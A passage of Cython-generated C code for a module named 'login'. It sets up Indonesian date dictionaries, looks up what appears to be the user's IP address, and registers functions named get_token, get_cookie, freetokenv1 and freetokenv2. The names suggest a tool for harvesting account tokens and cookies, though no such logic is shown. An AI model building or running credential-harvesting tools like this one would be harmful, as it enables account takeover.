  if (PyDict_SetItem(__pyx_t_2, __pyx_n_u_Friday, __pyx_n_u_Jumat) < 0) __PYX_ERR(0, 41, __pyx_L1_error)
  if (PyDict_SetItem(__pyx_t_2, __pyx_n_u_Saturday, __pyx_n_u_Sabtu) < 0) __PYX_ERR(0, 41, __pyx_L1_error)
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_cv_hr, __pyx_t_2) < 0) __PYX_ERR(0, 41, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  
  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_cv_hr); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 42, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_hr); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 42, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __pyx_t_9 = __Pyx_PyObject_GetItem(__pyx_t_2, __pyx_t_1); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 42, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_9);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_nama_hari, __pyx_t_9) < 0) __PYX_ERR(0, 42, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;

  
  __pyx_t_9 = PyTuple_New(7); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 43, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_9);
  __pyx_t_11 = 0;
  __pyx_t_12 = 127;
  __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_nama_hari); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 43, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __pyx_t_2 = __Pyx_PyObject_FormatSimpleAndDecref(PyObject_Unicode(__pyx_t_1), __pyx_empty_unicode); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 43, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_12 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_2) > __pyx_t_12) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_2) : __pyx_t_12;
  __pyx_t_11 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_2);
  __Pyx_GIVEREF(__pyx_t_2);
  PyTuple_SET_ITEM(__pyx_t_9, 0, __pyx_t_2);
  __pyx_t_2 = 0;
  __Pyx_INCREF(__pyx_kp_u__23);
  __pyx_t_11 += 1;
  __Pyx_GIVEREF(__pyx_kp_u__23);
  PyTuple_SET_ITEM(__pyx_t_9, 1, __pyx_kp_u__23);
  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_ha); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 43, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __pyx_t_1 = __Pyx_PyObject_FormatSimpleAndDecref(PyObject_Unicode(__pyx_t_2), __pyx_empty_unicode); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 43, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_12 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_1) > __pyx_t_12) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_1) : __pyx_t_12;
  __pyx_t_11 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_1);
  __Pyx_GIVEREF(__pyx_t_1);
  PyTuple_SET_ITEM(__pyx_t_9, 2, __pyx_t_1);
  __pyx_t_1 = 0;
  __Pyx_INCREF(__pyx_kp_u__23);
  __pyx_t_11 += 1;
  __Pyx_GIVEREF(__pyx_kp_u__23);
  PyTuple_SET_ITEM(__pyx_t_9, 3, __pyx_kp_u__23);
  __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_op); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 43, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __pyx_t_2 = __Pyx_PyObject_FormatSimpleAndDecref(PyObject_Unicode(__pyx_t_1), __pyx_empty_unicode); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 43, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_12 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_2) > __pyx_t_12) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_2) : __pyx_t_12;
  __pyx_t_11 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_2);
  __Pyx_GIVEREF(__pyx_t_2);
  PyTuple_SET_ITEM(__pyx_t_9, 4, __pyx_t_2);
  __pyx_t_2 = 0;
  __Pyx_INCREF(__pyx_kp_u__23);
  __pyx_t_11 += 1;
  __Pyx_GIVEREF(__pyx_kp_u__23);
  PyTuple_SET_ITEM(__pyx_t_9, 5, __pyx_kp_u__23);
  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_ta); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 43, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __pyx_t_1 = __Pyx_PyObject_FormatSimpleAndDecref(PyObject_Unicode(__pyx_t_2), __pyx_empty_unicode); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 43, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_12 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_1) > __pyx_t_12) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_1) : __pyx_t_12;
  __pyx_t_11 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_1);
  __Pyx_GIVEREF(__pyx_t_1);
  PyTuple_SET_ITEM(__pyx_t_9, 6, __pyx_t_1);
  __pyx_t_1 = 0;
  __pyx_t_1 = __Pyx_PyUnicode_Join(__pyx_t_9, 7, __pyx_t_11, __pyx_t_12); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 43, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_tanggal, __pyx_t_1) < 0) __PYX_ERR(0, 43, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_1 = PyTuple_New(5); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 43, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __pyx_t_11 = 0;
  __pyx_t_12 = 127;
  __Pyx_GetModuleGlobalName(__pyx_t_9, __pyx_n_s_ha); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 43, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_9);
  __pyx_t_2 = __Pyx_PyObject_FormatSimpleAndDecref(PyObject_Unicode(__pyx_t_9), __pyx_empty_unicode); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 43, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
  __pyx_t_12 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_2) > __pyx_t_12) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_2) : __pyx_t_12;
  __pyx_t_11 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_2);
  __Pyx_GIVEREF(__pyx_t_2);
  PyTuple_SET_ITEM(__pyx_t_1, 0, __pyx_t_2);
  __pyx_t_2 = 0;
  __Pyx_INCREF(__pyx_kp_u_);
  __pyx_t_11 += 1;
  __Pyx_GIVEREF(__pyx_kp_u_);
  PyTuple_SET_ITEM(__pyx_t_1, 1, __pyx_kp_u_);
  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_op); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 43, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __pyx_t_9 = __Pyx_PyObject_FormatSimpleAndDecref(PyObject_Unicode(__pyx_t_2), __pyx_empty_unicode); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 43, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_9);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_12 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_9) > __pyx_t_12) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_9) : __pyx_t_12;
  __pyx_t_11 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_9);
  __Pyx_GIVEREF(__pyx_t_9);
  PyTuple_SET_ITEM(__pyx_t_1, 2, __pyx_t_9);
  __pyx_t_9 = 0;
  __Pyx_INCREF(__pyx_kp_u_);
  __pyx_t_11 += 1;
  __Pyx_GIVEREF(__pyx_kp_u_);
  PyTuple_SET_ITEM(__pyx_t_1, 3, __pyx_kp_u_);
  __Pyx_GetModuleGlobalName(__pyx_t_9, __pyx_n_s_ta); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 43, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_9);
  __pyx_t_2 = __Pyx_PyObject_FormatSimpleAndDecref(PyObject_Unicode(__pyx_t_9), __pyx_empty_unicode); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 43, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
  __pyx_t_12 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_2) > __pyx_t_12) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_2) : __pyx_t_12;
  __pyx_t_11 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_2);
  __Pyx_GIVEREF(__pyx_t_2);
  PyTuple_SET_ITEM(__pyx_t_1, 4, __pyx_t_2);
  __pyx_t_2 = 0;
  __pyx_t_2 = __Pyx_PyUnicode_Join(__pyx_t_1, 5, __pyx_t_11, __pyx_t_12); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 43, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_tgl, __pyx_t_2) < 0) __PYX_ERR(0, 43, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = __Pyx_PyDict_NewPresized(12); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 43, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  if (PyDict_SetItem(__pyx_t_2, __pyx_kp_u_01, __pyx_n_u_Januari) < 0) __PYX_ERR(0, 43, __pyx_L1_error)
  if (PyDict_SetItem(__pyx_t_2, __pyx_kp_u_02, __pyx_n_u_Februari) < 0) __PYX_ERR(0, 43, __pyx_L1_error)
  if (PyDict_SetItem(__pyx_t_2, __pyx_kp_u_03, __pyx_n_u_Maret) < 0) __PYX_ERR(0, 43, __pyx_L1_error)
  if (PyDict_SetItem(__pyx_t_2, __pyx_kp_u_04, __pyx_n_u_April) < 0) __PYX_ERR(0, 43, __pyx_L1_error)
  if (PyDict_SetItem(__pyx_t_2, __pyx_kp_u_05, __pyx_n_u_Mei) < 0) __PYX_ERR(0, 43, __pyx_L1_error)
  if (PyDict_SetItem(__pyx_t_2, __pyx_kp_u_06, __pyx_n_u_Juni) < 0) __PYX_ERR(0, 43, __pyx_L1_error)
  if (PyDict_SetItem(__pyx_t_2, __pyx_kp_u_07, __pyx_n_u_Juli) < 0) __PYX_ERR(0, 43, __pyx_L1_error)
  if (PyDict_SetItem(__pyx_t_2, __pyx_kp_u_08, __pyx_n_u_Agustus) < 0) __PYX_ERR(0, 43, __pyx_L1_error)
  if (PyDict_SetItem(__pyx_t_2, __pyx_kp_u_09, __pyx_n_u_September) < 0) __PYX_ERR(0, 43, __pyx_L1_error)
  if (PyDict_SetItem(__pyx_t_2, __pyx_kp_u_10, __pyx_n_u_Oktober) < 0) __PYX_ERR(0, 43, __pyx_L1_error)
  if (PyDict_SetItem(__pyx_t_2, __pyx_kp_u_11, __pyx_n_u_November) < 0) __PYX_ERR(0, 43, __pyx_L1_error)
  if (PyDict_SetItem(__pyx_t_2, __pyx_kp_u_12, __pyx_n_u_Desember) < 0) __PYX_ERR(0, 43, __pyx_L1_error)
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_bulan_ttl, __pyx_t_2) < 0) __PYX_ERR(0, 43, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = __Pyx_PyDict_NewPresized(12); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 43, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  if (PyDict_SetItem(__pyx_t_2, __pyx_n_u_january, __pyx_n_u_Januari) < 0) __PYX_ERR(0, 43, __pyx_L1_error)
  if (PyDict_SetItem(__pyx_t_2, __pyx_n_u_february, __pyx_n_u_Februari) < 0) __PYX_ERR(0, 43, __pyx_L1_error)
  if (PyDict_SetItem(__pyx_t_2, __pyx_n_u_march, __pyx_n_u_Maret) < 0) __PYX_ERR(0, 43, __pyx_L1_error)
  if (PyDict_SetItem(__pyx_t_2, __pyx_n_u_april, __pyx_n_u_April) < 0) __PYX_ERR(0, 43, __pyx_L1_error)
  if (PyDict_SetItem(__pyx_t_2, __pyx_n_u_may, __pyx_n_u_Mei) < 0) __PYX_ERR(0, 43, __pyx_L1_error)
  if (PyDict_SetItem(__pyx_t_2, __pyx_n_u_june, __pyx_n_u_Juni) < 0) __PYX_ERR(0, 43, __pyx_L1_error)
  if (PyDict_SetItem(__pyx_t_2, __pyx_n_u_july, __pyx_n_u_Juli) < 0) __PYX_ERR(0, 43, __pyx_L1_error)
  if (PyDict_SetItem(__pyx_t_2, __pyx_n_u_august, __pyx_n_u_Agustus) < 0) __PYX_ERR(0, 43, __pyx_L1_error)
  if (PyDict_SetItem(__pyx_t_2, __pyx_n_u_september, __pyx_n_u_September) < 0) __PYX_ERR(0, 43, __pyx_L1_error)
  if (PyDict_SetItem(__pyx_t_2, __pyx_n_u_october, __pyx_n_u_Oktober) < 0) __PYX_ERR(0, 43, __pyx_L1_error)
  if (PyDict_SetItem(__pyx_t_2, __pyx_n_u_november, __pyx_n_u_November) < 0) __PYX_ERR(0, 43, __pyx_L1_error)
  if (PyDict_SetItem(__pyx_t_2, __pyx_n_u_december, __pyx_n_u_Desember) < 0) __PYX_ERR(0, 43, __pyx_L1_error)
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_bulan_x, __pyx_t_2) < 0) __PYX_ERR(0, 43, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  
  __pyx_t_2 = __Pyx_PyDict_NewPresized(12); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 44, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  if (PyDict_SetItem(__pyx_t_2, __pyx_n_u_januari, __pyx_kp_u_1_2) < 0) __PYX_ERR(0, 44, __pyx_L1_error)
  if (PyDict_SetItem(__pyx_t_2, __pyx_n_u_february, __pyx_kp_u_2) < 0) __PYX_ERR(0, 44, __pyx_L1_error)
  if (PyDict_SetItem(__pyx_t_2, __pyx_n_u_march, __pyx_kp_u_3) < 0) __PYX_ERR(0, 44, __pyx_L1_error)
  if (PyDict_SetItem(__pyx_t_2, __pyx_n_u_april, __pyx_kp_u_4) < 0) __PYX_ERR(0, 44, __pyx_L1_error)
  if (PyDict_SetItem(__pyx_t_2, __pyx_n_u_mei, __pyx_kp_u_5) < 0) __PYX_ERR(0, 44, __pyx_L1_error)
  if (PyDict_SetItem(__pyx_t_2, __pyx_n_u_juni, __pyx_kp_u_6) < 0) __PYX_ERR(0, 44, __pyx_L1_error)
  if (PyDict_SetItem(__pyx_t_2, __pyx_n_u_juli, __pyx_kp_u_7) < 0) __PYX_ERR(0, 44, __pyx_L1_error)
  if (PyDict_SetItem(__pyx_t_2, __pyx_kp_u_8, __pyx_n_u_agustus) < 0) __PYX_ERR(0, 44, __pyx_L1_error)
  if (PyDict_SetItem(__pyx_t_2, __pyx_n_u_september, __pyx_kp_u_9) < 0) __PYX_ERR(0, 44, __pyx_L1_error)
  if (PyDict_SetItem(__pyx_t_2, __pyx_n_u_oktober, __pyx_kp_u_10) < 0) __PYX_ERR(0, 44, __pyx_L1_error)
  if (PyDict_SetItem(__pyx_t_2, __pyx_n_u_november, __pyx_kp_u_11) < 0) __PYX_ERR(0, 44, __pyx_L1_error)
  if (PyDict_SetItem(__pyx_t_2, __pyx_n_u_desember, __pyx_kp_u_12) < 0) __PYX_ERR(0, 44, __pyx_L1_error)
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_bulan_balik, __pyx_t_2) < 0) __PYX_ERR(0, 44, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  
  {
    __Pyx_PyThreadState_declare
    __Pyx_PyThreadState_assign
    __Pyx_ExceptionSave(&__pyx_t_5, &__pyx_t_4, &__pyx_t_3);
    __Pyx_XGOTREF(__pyx_t_5);
    __Pyx_XGOTREF(__pyx_t_4);
    __Pyx_XGOTREF(__pyx_t_3);
     {
      __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_ses); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 45, __pyx_L13_error)
      __Pyx_GOTREF(__pyx_t_2);
      __pyx_t_1 = __Pyx_PyObject_GetAttrStr(__pyx_t_2, __pyx_n_s_get); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 45, __pyx_L13_error)
      __Pyx_GOTREF(__pyx_t_1);
      __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
      __pyx_t_2 = __Pyx_PyObject_Call(__pyx_t_1, __pyx_tuple__24, NULL); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 45, __pyx_L13_error)
      __Pyx_GOTREF(__pyx_t_2);
      __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
      __pyx_t_1 = __Pyx_PyObject_GetAttrStr(__pyx_t_2, __pyx_n_s_json); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 45, __pyx_L13_error)
      __Pyx_GOTREF(__pyx_t_1);
      __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
      __pyx_t_2 = __Pyx_PyObject_CallNoArg(__pyx_t_1); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 45, __pyx_L13_error)
      __Pyx_GOTREF(__pyx_t_2);
      __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
      __pyx_t_1 = __Pyx_PyObject_Dict_GetItem(__pyx_t_2, __pyx_n_u_query); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 45, __pyx_L13_error)
      __Pyx_GOTREF(__pyx_t_1);
      __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
      if (PyDict_SetItem(__pyx_d, __pyx_n_s_IP, __pyx_t_1) < 0) __PYX_ERR(0, 45, __pyx_L13_error)
      __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
    }
    __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
    __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
    __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
    goto __pyx_L18_try_end;
    __pyx_L13_error:;
    __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
    __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
    __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
    __Pyx_XDECREF(__pyx_t_9); __pyx_t_9 = 0;

    
    __Pyx_ErrFetch(&__pyx_t_1, &__pyx_t_2, &__pyx_t_9);
    __Pyx_GetModuleGlobalName(__pyx_t_10, __pyx_n_s_requests); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 46, __pyx_L15_except_error)
    __Pyx_GOTREF(__pyx_t_10);
    __pyx_t_13 = __Pyx_PyObject_GetAttrStr(__pyx_t_10, __pyx_n_s_exceptions); if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 46, __pyx_L15_except_error)
    __Pyx_GOTREF(__pyx_t_13);
    __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
    __pyx_t_10 = __Pyx_PyObject_GetAttrStr(__pyx_t_13, __pyx_n_s_ConnectionError); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 46, __pyx_L15_except_error)
    __Pyx_GOTREF(__pyx_t_10);
    __Pyx_DECREF(__pyx_t_13); __pyx_t_13 = 0;
    __pyx_t_8 = __Pyx_PyErr_GivenExceptionMatches(__pyx_t_1, __pyx_t_10);
    __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
    __Pyx_ErrRestore(__pyx_t_1, __pyx_t_2, __pyx_t_9);
    __pyx_t_1 = 0; __pyx_t_2 = 0; __pyx_t_9 = 0;
    if (__pyx_t_8) {
      __Pyx_AddTraceback("login", __pyx_clineno, __pyx_lineno, __pyx_filename);
      if (__Pyx_GetException(&__pyx_t_9, &__pyx_t_2, &__pyx_t_1) < 0) __PYX_ERR(0, 46, __pyx_L15_except_error)
      __Pyx_GOTREF(__pyx_t_9);
      __Pyx_GOTREF(__pyx_t_2);
      __Pyx_GOTREF(__pyx_t_1);
      __pyx_t_10 = __Pyx_PyObject_Call(__pyx_builtin_exit, __pyx_tuple__25, NULL); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 46, __pyx_L15_except_error)
      __Pyx_GOTREF(__pyx_t_10);
      __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
      __Pyx_XDECREF(__pyx_t_9); __pyx_t_9 = 0;
      __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
      __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
      goto __pyx_L14_exception_handled;
    }
    goto __pyx_L15_except_error;
    __pyx_L15_except_error:;

    
    __Pyx_XGIVEREF(__pyx_t_5);
    __Pyx_XGIVEREF(__pyx_t_4);
    __Pyx_XGIVEREF(__pyx_t_3);
    __Pyx_ExceptionReset(__pyx_t_5, __pyx_t_4, __pyx_t_3);
    goto __pyx_L1_error;
    __pyx_L14_exception_handled:;
    __Pyx_XGIVEREF(__pyx_t_5);
    __Pyx_XGIVEREF(__pyx_t_4);
    __Pyx_XGIVEREF(__pyx_t_3);
    __Pyx_ExceptionReset(__pyx_t_5, __pyx_t_4, __pyx_t_3);
    __pyx_L18_try_end:;
  }

  
  __pyx_t_1 = __Pyx_CyFunction_New(&__pyx_mdef_5login_1logo, 0, __pyx_n_s_logo, NULL, __pyx_n_s_login, __pyx_d, ((PyObject *)__pyx_codeobj__27)); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 48, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_logo, __pyx_t_1) < 0) __PYX_ERR(0, 48, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __pyx_t_1 = __Pyx_PyDict_NewPresized(12); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 58, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (PyDict_SetItem(__pyx_t_1, __pyx_n_u_January, __pyx_kp_u_1_2) < 0) __PYX_ERR(0, 58, __pyx_L1_error)
  if (PyDict_SetItem(__pyx_t_1, __pyx_n_u_February, __pyx_kp_u_2) < 0) __PYX_ERR(0, 58, __pyx_L1_error)
  if (PyDict_SetItem(__pyx_t_1, __pyx_n_u_March, __pyx_kp_u_3) < 0) __PYX_ERR(0, 58, __pyx_L1_error)
  if (PyDict_SetItem(__pyx_t_1, __pyx_n_u_April, __pyx_kp_u_4) < 0) __PYX_ERR(0, 58, __pyx_L1_error)
  if (PyDict_SetItem(__pyx_t_1, __pyx_n_u_May, __pyx_kp_u_5) < 0) __PYX_ERR(0, 58, __pyx_L1_error)
  if (PyDict_SetItem(__pyx_t_1, __pyx_n_u_June, __pyx_kp_u_6) < 0) __PYX_ERR(0, 58, __pyx_L1_error)
  if (PyDict_SetItem(__pyx_t_1, __pyx_n_u_July, __pyx_kp_u_7) < 0) __PYX_ERR(0, 58, __pyx_L1_error)
  if (PyDict_SetItem(__pyx_t_1, __pyx_n_u_Agustus, __pyx_kp_u_8) < 0) __PYX_ERR(0, 58, __pyx_L1_error)
  if (PyDict_SetItem(__pyx_t_1, __pyx_n_u_September, __pyx_kp_u_9) < 0) __PYX_ERR(0, 58, __pyx_L1_error)
  if (PyDict_SetItem(__pyx_t_1, __pyx_n_u_October, __pyx_kp_u_10) < 0) __PYX_ERR(0, 58, __pyx_L1_error)
  if (PyDict_SetItem(__pyx_t_1, __pyx_n_u_November, __pyx_kp_u_11) < 0) __PYX_ERR(0, 58, __pyx_L1_error)
  if (PyDict_SetItem(__pyx_t_1, __pyx_n_u_December, __pyx_kp_u_12) < 0) __PYX_ERR(0, 58, __pyx_L1_error)
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_bulan_balik, __pyx_t_1) < 0) __PYX_ERR(0, 58, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __pyx_t_1 = __Pyx_CyFunction_New(&__pyx_mdef_5login_3datawaktu, 0, __pyx_n_s_datawaktu, NULL, __pyx_n_s_login, __pyx_d, ((PyObject *)__pyx_codeobj__29)); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 60, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_datawaktu, __pyx_t_1) < 0) __PYX_ERR(0, 60, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __pyx_t_1 = __Pyx_CyFunction_New(&__pyx_mdef_5login_5ceklisen, 0, __pyx_n_s_ceklisen, NULL, __pyx_n_s_login, __pyx_d, ((PyObject *)__pyx_codeobj__31)); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 73, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_ceklisen, __pyx_t_1) < 0) __PYX_ERR(0, 73, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __pyx_t_1 = __Pyx_CyFunction_New(&__pyx_mdef_5login_7login, 0, __pyx_n_s_login, NULL, __pyx_n_s_login, __pyx_d, ((PyObject *)__pyx_codeobj__33)); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 97, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_login, __pyx_t_1) < 0) __PYX_ERR(0, 97, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __pyx_t_1 = __Pyx_CyFunction_New(&__pyx_mdef_5login_9get_token, 0, __pyx_n_s_get_token, NULL, __pyx_n_s_login, __pyx_d, ((PyObject *)__pyx_codeobj__35)); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 139, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_get_token, __pyx_t_1) < 0) __PYX_ERR(0, 139, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __pyx_t_1 = __Pyx_CyFunction_New(&__pyx_mdef_5login_11get_cookie, 0, __pyx_n_s_get_cookie, NULL, __pyx_n_s_login, __pyx_d, ((PyObject *)__pyx_codeobj__37)); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 152, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_get_cookie, __pyx_t_1) < 0) __PYX_ERR(0, 152, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __pyx_t_1 = __Pyx_CyFunction_New(&__pyx_mdef_5login_13freetokenv1, 0, __pyx_n_s_freetokenv1, NULL, __pyx_n_s_login, __pyx_d, ((PyObject *)__pyx_codeobj__39)); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 170, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_freetokenv1, __pyx_t_1) < 0) __PYX_ERR(0, 170, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __pyx_t_1 = __Pyx_CyFunction_New(&__pyx_mdef_5login_15freetokenv2, 0, __pyx_n_s_freetokenv2, NULL, __pyx_n_s_login, __pyx_d, ((PyObject *)__pyx_codeobj__41)); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 192, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
